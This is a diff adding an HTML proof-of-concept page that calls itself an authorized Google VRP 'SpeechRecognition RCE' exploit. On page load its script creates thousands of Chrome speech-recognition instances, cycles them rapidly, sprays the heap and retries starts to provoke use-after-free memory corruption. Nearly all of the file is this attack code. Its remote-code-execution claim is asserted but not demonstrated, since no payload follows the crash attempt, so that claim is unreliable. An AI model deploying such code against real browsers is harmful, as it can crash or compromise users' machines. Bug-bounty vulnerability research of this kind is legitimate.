@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SpeechRecognition RCE PoC</title>
+</head>
+<body>
+    <h1>SpeechRecognition RCE PoC - Google VRP Authorized</h1>
+    <div id="status">Initializing PoC...</div>
+    
+    <script>
+        let recognizers = [];
+        const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
+
+        // Create and manipulate SpeechRecognition instances
+        function createSpeechRecognizers(count) {
+            if (!SpeechRecognition) return;
+
+            for (let i = 0; i < count; i++) {
+                try {
+                    const recognition = new SpeechRecognition();
+                    const id = recognizers.length;
+                    recognizers.push(recognition);
+
+                    // Configure for maximum stress
+                    recognition.lang = 'en-US';
+                    recognition.interimResults = true; // Increase memory pressure
+                    recognition.maxAlternatives = 10;  // Push resource limits
+                    recognition.continuous = true;    // Keep alive longer
+
+                    // Overwrite event handlers to stress memory
+                    recognition.onresult = function(event) {
+                        // Simulate heavy processing
+                        let buf = new ArrayBuffer(1024 * 1024); // 1MB allocation
+                        let view = new Uint8Array(buf);
+                        for (let j = 0; j < view.length; j++) {
+                            view[j] = event.results[0][0].transcript.charCodeAt(0);
+                        }
+                        console.log(`Recognizer ${id} processed`);
+                    };
+
+                    recognition.onerror = function(event) {
+                        console.error(`Recognizer ${id} error: ${event.error}`);
+                        // Intentionally don't cleanup immediately to pile up instances
+                    };
+
+                    recognition.onend = function() {
+                        console.log(`Recognizer ${id} ended`);
+                        // Attempt to restart immediately to confuse garbage collection
+                        try {
+                            recognition.start();
+                        } catch (e) {}
+                    };
+
+                    // Start with aggressive timing
+                    recognition.start();
+                    console.log(`Started recognizer ${id}`);
+
+                    // Rapid stop/start cycle to trigger potential race conditions
+                    setTimeout(() => {
+                        try {
+                            recognition.stop();
+                            setTimeout(() => {
+                                recognition.start(); // Double-start attempt
+                            }, 1);
+                        } catch (e) {
+                            console.error(`Cycle error on ${id}:`, e);
+                        }
+                    }, Math.random() * 50);
+                } catch (e) {
+                    console.error(`Creation error ${i}:`, e);
+                }
+            }
+        }
+
+        // Trigger potential memory corruption for RCE
+        function triggerSpeechRecognitionRCE() {
+            if (!SpeechRecognition) return;
+
+            let totalRuns = 0;
+            const batchSize = 1000; // High volume to stress heap
+            const maxRuns = 50;
+            document.getElementById('status').textContent = 'Executing RCE PoC...';
+
+            function exploitBatch() {
+                console.log(`Batch ${totalRuns + 1}/${maxRuns} - Instances: ${recognizers.length}`);
+                createSpeechRecognizers(batchSize);
+
+                // Spray heap with objects
+                setTimeout(() => {
+                    let spray = [];
+                    for (let i = 0; i < 10000; i++) {
+                        spray.push(new ArrayBuffer(1024)); // Heap spray
+                    }
+
+                    // Attempt to reuse freed memory
+                    recognizers.forEach((rec, idx) => {
+                        if (rec) {
+                            try {
+                                rec.stop();
+                                rec.start(); // Use-after-free potential
+                            } catch (e) {}
+                        }
+                    });
+
+                    totalRuns++;
+                    if (totalRuns < maxRuns) {
+                        setTimeout(exploitBatch, 100); // Faster iteration
+                    } else {
+                        document.getElementById('status').textContent = 
+                            'PoC completed - Check for crash or corruption';
+                        console.log('PoC execution finished');
+                        // At this point, check browser crash logs or memory state
+                    }
+                }, 150);
+            }
+
+            exploitBatch();
+        }
+
+        // Start on load with sanity check
+        window.onload = function() {
+            if (!SpeechRecognition) {
+                document.getElementById('status').textContent = 
+                    'SpeechRecognition not supported - PoC requires Chrome';
+                console.error("SpeechRecognition API not available");
+                alert("This PoC requires Chrome with SpeechRecognition support");
+                return;
+            }
+
+            console.log("Starting SpeechRecognition RCE PoC...");
+            triggerSpeechRecognitionRCE();
+        };
+
+        // Minimal cleanup (intentionally limited for PoC)
+        window.onbeforeunload = () => {
+            recognizers.forEach(rec => {
+                try {
+                    rec?.abort();
+                } catch (e) {}
+            });
+        };
+    </script>
+</body>
+</html>
